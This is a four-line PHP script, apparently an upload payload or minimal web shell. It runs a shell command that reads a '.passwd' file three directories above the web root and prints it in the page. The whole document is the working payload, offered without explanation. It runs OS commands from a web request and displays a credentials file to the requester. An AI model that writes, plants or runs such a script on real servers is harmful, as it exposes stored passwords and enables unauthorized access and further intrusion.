<?php
    $output = shell_exec('cat ../../../.passwd');
    echo "<pre>$output</pre>";
?>